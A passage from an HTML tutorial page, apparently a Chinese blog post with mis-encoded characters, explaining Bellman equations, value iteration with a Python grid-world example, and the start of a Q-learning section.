class="mclose">)</span></span></span></span></span>ä¸ºå¥–åŠ±å‡½æ•°</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î³</mi></mrow><annotation encoding="application/x-tex">Î³</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span></span></span></span></span>ä¸ºæŠ˜æ‰£å› å­ï¼Œæ§åˆ¶æœªæ¥å¥–åŠ±çš„é‡è¦æ€§</li>
</ul>
<p>ä¸€æ—¦æ±‚å¾—æœ€ä¼˜çŠ¶æ€ä»·å€¼å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>V</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V^*(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>ï¼Œæœ€ä¼˜ç­–ç•¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Ï€</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Ï€^âˆ—(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>å¯ä»¥é€šè¿‡é€‰æ‹©åœ¨å½“å‰çŠ¶æ€ä¸‹èƒ½è·å¾—æœ€å¤§æœŸæœ›æ”¶ç›Šçš„åŠ¨ä½œå¾—åˆ°ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Ï€</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi>arg</mi><mo>â¡</mo><msub><mrow><mi>max</mi><mo>â¡</mo></mrow><mi>a</mi></msub><msub><mo>âˆ‘</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></msub><mi>P</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mi mathvariant="normal">âˆ£</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mo>+</mo><mi>Î³</mi><msup><mi>V</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">\pi^*(s) = \arg\max_a \sum_{s'} P(s'|s,a) \big[ R(s,a,s') + \gamma V^*(s') \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1783em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></p>
<p>å€¼è¿­ä»£ï¼ˆValue Iterationï¼‰ æ˜¯ä¸€ç§åŸºäºåŠ¨æ€è§„åˆ’çš„è¿­ä»£æ–¹æ³•ï¼Œç”¨äºæ±‚è§£ MDP çš„æœ€ä¼˜çŠ¶æ€ä»·å€¼å‡½æ•°å’Œç­–ç•¥ã€‚å®ƒçš„ä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆå§‹åŒ–ï¼šå°†æ¯ä¸ªçŠ¶æ€çš„ä»·å€¼å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></span>åˆå§‹åŒ–ä¸º 0 æˆ–ä»»æ„å€¼ã€‚</li>
<li>è¿­ä»£æ›´æ–°ï¼šå¯¹äºæ¯ä¸ªçŠ¶æ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>ï¼Œæ›´æ–°å…¶ä»·å€¼ï¼š <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>â†</mo><msub><mrow><mi>max</mi><mo>â¡</mo></mrow><mi>a</mi></msub><msub><mo>âˆ‘</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></msub><mi>P</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mi mathvariant="normal">âˆ£</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mi>R</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo separator="true">,</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mo>+</mo><mi>Î³</mi><mi>V</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">V(s) \leftarrow \max_a \sum_{s'} P(s'|s,a) \big[ R(s,a,s') + \gamma V(s') \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1783em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord">âˆ£</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Î³V</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></li>
<li>æ”¶æ•›åˆ¤å®šï¼šå½“æ‰€æœ‰çŠ¶æ€ä»·å€¼æ›´æ–°å˜åŒ–é‡ Î”å°äºé˜ˆå€¼ Î¸æ—¶ï¼Œè¿­ä»£åœæ­¢ã€‚</li>
<li>å¯¼å‡ºæœ€ä¼˜ç­–ç•¥ï¼šæ ¹æ®æ”¶æ•›åçš„ä»·å€¼å‡½æ•°ï¼Œé€‰æ‹©ä½¿æœŸæœ›æ”¶ç›Šæœ€å¤§çš„åŠ¨ä½œä½œä¸ºæœ€ä¼˜ç­–ç•¥ã€‚</li>
</ol>
<p>ç›¸æ¯”ç­–ç•¥è¿­ä»£ï¼Œå€¼è¿­ä»£æ¯ä¸€æ­¥åªæ›´æ–°ä»·å€¼å‡½æ•°ï¼Œä¸éœ€è¦æ˜¾å¼åœ°ä¿å­˜å’Œæ›´æ–°ç­–ç•¥ï¼Œå› æ­¤å®ç°æ›´ç®€å•ä¸”è®¡ç®—æ•ˆç‡é«˜ã€‚</p>
<p>ä¸‹é¢é€šè¿‡ä¸€ä¸ª 4Ã—4 ç½‘æ ¼ä¸–ç•Œç¤ºä¾‹å±•ç¤ºå€¼è¿­ä»£çš„å®ç°ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt

<span class="hljs-comment"># ç½‘æ ¼ä¸–ç•Œå‚æ•°</span>
n_rows, <span class="hljs-attr">n_cols</span> = <span class="hljs-number">4</span>, <span class="hljs-number">4</span>
<span class="hljs-attr">n_states</span> = n_rows * n_cols
<span class="hljs-attr">n_actions</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># ä¸Š,ä¸‹,å·¦,å³</span>
<span class="hljs-attr">action_offsets</span> = [(-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]
<span class="hljs-attr">action_symbols</span> = [<span class="hljs-string">'â†‘'</span>,<span class="hljs-string">'â†“'</span>,<span class="hljs-string">'â†'</span>,<span class="hljs-string">'â†’'</span>]

<span class="hljs-attr">start_state</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">terminal_state</span> = n_states-<span class="hljs-number">1</span>
<span class="hljs-attr">reward_step</span> = -<span class="hljs-number">1</span>
<span class="hljs-attr">reward_terminal</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">gamma</span> = <span class="hljs-number">0.9</span>
<span class="hljs-attr">theta</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">4</span>

def next_state_reward(s,a):
    row,<span class="hljs-attr">col</span> = divmod(s,n_cols)
    if <span class="hljs-attr">s</span>==terminal_state:
        return s, reward_terminal
    dr,<span class="hljs-attr">dc</span> = action_<span class="hljs-literal">off</span>sets[a]
    <span class="hljs-attr">new_row</span> = min(max(row+dr,<span class="hljs-number">0</span>),n_rows-<span class="hljs-number">1</span>)
    <span class="hljs-attr">new_col</span> = min(max(col+dc,<span class="hljs-number">0</span>),n_cols-<span class="hljs-number">1</span>)
    <span class="hljs-attr">s_next</span> = new_row*n_cols+new_col
    return s_next, reward_step

<span class="hljs-comment"># å€¼è¿­ä»£</span>
<span class="hljs-attr">V</span> = np.zeros(n_states)
while True:
    <span class="hljs-attr">delta</span> = <span class="hljs-number">0</span>
    for s in range(n_states):
        if <span class="hljs-attr">s</span>==terminal_state:
            continue
        <span class="hljs-attr">v</span> = V[s]
        V<span class="hljs-section">[s]</span> = max(<span class="hljs-section">[next_state_reward(s,a)[1]</span>+gamma*V<span class="hljs-section">[next_state_reward(s,a)[0]]</span> for a in range(n_actions)])
        <span class="hljs-attr">delta</span> = max(delta, abs(v-V[s]))
    if delta&lt;theta:
        break

<span class="hljs-comment"># å¯¼å‡ºæœ€ä¼˜ç­–ç•¥</span>
<span class="hljs-attr">policy</span> = np.full(n_states,<span class="hljs-string">''</span>,dtype=object)
for s in range(n_states):
    if <span class="hljs-attr">s</span>==start_state:
        policy<span class="hljs-section">[s]</span>='S'
    elif <span class="hljs-attr">s</span>==terminal_state:
        policy<span class="hljs-section">[s]</span>='T'
    else:
        <span class="hljs-attr">q_values</span> = [next_state_reward(s,a)[<span class="hljs-number">1</span>]+gamma*V[next_state_reward(s,a)[<span class="hljs-number">0</span>]] for a in range(n_actions)]
        policy<span class="hljs-section">[s]</span>=action_symbols<span class="hljs-section">[np.argmax(q_values)]</span>

<span class="hljs-attr">grid_policy</span> = policy.reshape(n_rows,n_cols)
print("æœ€ä¼˜ç­–ç•¥ï¼š")
print(grid_policy)

<span class="hljs-comment"># å¯è§†åŒ–å€¼å‡½æ•°å’Œç­–ç•¥</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))
plt.imshow(V.reshape(n_rows,n_cols), <span class="hljs-attr">cmap</span>=<span class="hljs-string">'cool'</span>, interpolation=<span class="hljs-string">'nearest'</span>)
for i in range(n_rows):
    for j in range(n_cols):
        plt.text(j,i,f"{V<span class="hljs-section">[i*n_cols+j]</span>:.1f}\n{grid_policy<span class="hljs-section">[i,j]</span>}",<span class="hljs-attr">ha</span>=<span class="hljs-string">'center'</span>,va=<span class="hljs-string">'center'</span>,color=<span class="hljs-string">'black'</span>)
plt.title("Grid World: State Values and Optimal Policy")
plt.colorbar(<span class="hljs-attr">label</span>=<span class="hljs-string">"Value"</span>)
plt.show()
</code></pre>
<p>ç»“æœå¦‚ä¸‹ï¼Œå·¦ä¸Šè§’ä¸ºèµ·ç‚¹ Sï¼Œå³ä¸‹è§’ä¸ºç»ˆç‚¹ Tã€‚æ¯ä¸ªæ ¼å­æ˜¾ç¤ºå¯¹åº”çš„æœ€ä¼˜åŠ¨ä½œæ–¹å‘ï¼ˆâ†‘â†“â†â†’ï¼‰ï¼Œæ™ºèƒ½ä½“èƒ½å¤Ÿé¡ºåˆ©ä»èµ·ç‚¹åˆ°è¾¾ç»ˆç‚¹ï¼Œé¢œè‰²è¶Šæ·±è¡¨ç¤ºçŠ¶æ€ä»·å€¼è¶Šé«˜ï¼Œæ˜¾ç¤ºçŠ¶æ€è¶Šæ¥è¿‘ç»ˆç‚¹çš„ç´¯è®¡æ”¶ç›Šè¶Šå¤§ã€‚å€¼è¿­ä»£é€šè¿‡è¿­ä»£æ›´æ–°çŠ¶æ€ä»·å€¼å‡½æ•°ï¼Œæœ€ç»ˆæ”¶æ•›åˆ°æœ€ä¼˜å€¼å‡½æ•°ï¼Œä»è€Œå¯¼å‡ºå…¨å±€æœ€ä¼˜ç­–ç•¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/410cfb5217a4435c84711fb3694312e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529615&amp;x-signature=iZ8T70ifKZMk%2FixW9Y9gPoKxNFU%3D" alt="" loading="lazy"/></p>
<p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯åŠ¨æ€è§„åˆ’æä¾›äº†æ±‚è§£é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹çš„ä¸€èˆ¬æ¡†æ¶ï¼Œè€Œå€¼è¿­ä»£åˆ™æ˜¯æœ€å¸¸ç”¨çš„å®ç°æ–¹å¼ä¹‹ä¸€ã€‚é€šè¿‡è¿­ä»£æ›´æ–°çŠ¶æ€ä»·å€¼å‡½æ•°ï¼Œå€¼è¿­ä»£èƒ½å¤Ÿé«˜æ•ˆæ±‚å¾—æœ€ä¼˜ç­–ç•¥ã€‚</p>
<h3 data-id="heading-3">Q-learning</h3>
<p>Q-Learning æ˜¯å¼ºåŒ–å­¦ä¹ ä¸­æœ€ç»å…¸çš„åŸºäºå€¼å‡½æ•°çš„æ— æ¨¡å‹æ–¹æ³•ï¼ˆmodel-free methodï¼‰ä¹‹ä¸€ï¼Œç”¨äºæ±‚è§£é©¬å°”å¯å¤«å†³ç­–è¿‡ç¨‹ï¼ˆMDPï¼‰ä¸­çš„æœ€ä¼˜ç­–ç•¥ã€‚å®ƒä¸ä¾èµ–äºå·²çŸ¥çš„ç¯å¢ƒçŠ¶æ€è½¬ç§»æ¦‚ç‡ï¼Œåªéœ€é€šè¿‡æ™ºèƒ½ä½“ä¸ç¯å¢ƒçš„äº¤äº’ç»éªŒå°±èƒ½å­¦ä¹ æœ€ä¼˜ç­–ç•¥ï¼Œå› æ­¤åœ¨å®é™…å¼ºåŒ–å­¦ä¹ ä»»åŠ¡ä¸­åº”ç”¨å¹¿æ³›ã€‚</p>
<p>Q-Learning çš„æ ¸å¿ƒæ˜¯å­¦ä¹ æ¯ä¸ªçŠ¶æ€-åŠ¨ä½œå¯¹çš„ä»·å€¼å‡½æ•°ï¼ˆQ å‡½æ•°ï¼‰ï¼š</p>
<p>åœ¨çŠ¶æ€ä¸‹é€‰æ‹©åŠ¨ä½œçš„æœŸæœ›ç´¯ç§¯å›æŠ¥<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mtext>åœ¨çŠ¶æ€Â </mtext><mi>s</mi><mtext>ä¸‹é€‰æ‹©åŠ¨ä½œÂ </mtext><mi>a</mi><mtext>çš„æœŸæœ›ç´¯ç§¯å›æŠ¥</mtext></mrow><annotation encoding="application/x-tex">Q(s,a)=åœ¨çŠ¶æ€Â sä¸‹é€‰æ‹©åŠ¨ä½œÂ açš„æœŸæœ›ç´¯ç§¯å›æŠ¥</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">åœ¨çŠ¶æ€</span><span class="mord">Â </span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">ä¸‹é€‰æ‹©åŠ¨ä½œ</span><span class="mord">Â </span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">çš„æœŸæœ›ç´¯ç§¯å›æŠ¥</span></span></span></span></span></p>
<p>æœ€ä¼˜ Q å‡½æ•°æ»¡è¶³è´å°”æ›¼æœ€ä¼˜æ–¹ç¨‹ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="double-struck">E</mi><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><msub><mi>R</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><mi>Î³</mi><msub><mrow><mi>max</mi><mo>â¡</mo></mrow><msup><mi>a</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></msub><msup><mi>Q</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><msub><mi>s</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><msup><mi>a</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo stretchy="false">)</mo><mtext>â€‰</mtext><mi mathvariant="normal">âˆ£</mi><mtext>â€‰</mtext><msub><mi>s</mi><mi>t</mi></msub><mo>=</mo><mi>s</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>t</mi></msub><mo>=</mo><mi>a</mi><mo fence="false" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo></mrow><annotation encoding="application/x-tex">Q^*(s,a) = \mathbb{E}\big[ R_{t+1} + \gamma \max_{a'} Q^*(s_{t+1},a') \,|\, s_t=s, a_t=a \big]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathbb">E</span><span class="mord"><span class="delimsizing size1">[</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mspace" 